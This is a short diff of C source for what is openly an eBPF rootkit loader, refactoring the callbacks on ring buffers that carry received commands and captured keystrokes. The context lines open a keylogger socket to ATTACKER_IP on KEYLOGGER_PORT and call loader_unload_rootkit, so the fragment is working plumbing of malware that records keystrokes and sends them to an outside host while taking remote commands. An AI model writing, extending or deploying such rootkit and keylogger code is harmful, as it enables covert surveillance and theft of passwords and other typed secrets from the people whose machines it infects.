@@ -30,15 +30,16 @@ int main(int argc, char *argv[]) {
         .keylogger_socket_fd = keylogger_processor_init_sender_socket(ATTACKER_IP, KEYLOGGER_PORT),
     };
 
-    struct ring_buffer *command_event_rb = ring_buffer__new(
-        bpf_map__fd(skel->maps.events), handle_received_command, &application_ctx, NULL);
+    struct ring_buffer *command_event_rb =
+        ring_buffer__new(bpf_map__fd(skel->maps.events), command_processor_handle_received_command,
+                         &application_ctx, NULL);
     if (!command_event_rb) {
         loader_unload_rootkit(skel);
         return -ENOMEM;
     }
 
-    struct ring_buffer *keylog_event_rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events),
-                                                           process_key_event, &keylog_ctx, NULL);
+    struct ring_buffer *keylog_event_rb = ring_buffer__new(
+        bpf_map__fd(skel->maps.keylog_events), keylogger_processor_process_event, &keylog_ctx, NULL);
     if (!keylog_event_rb) {
         loader_unload_rootkit(skel);
         return -ENOMEM;
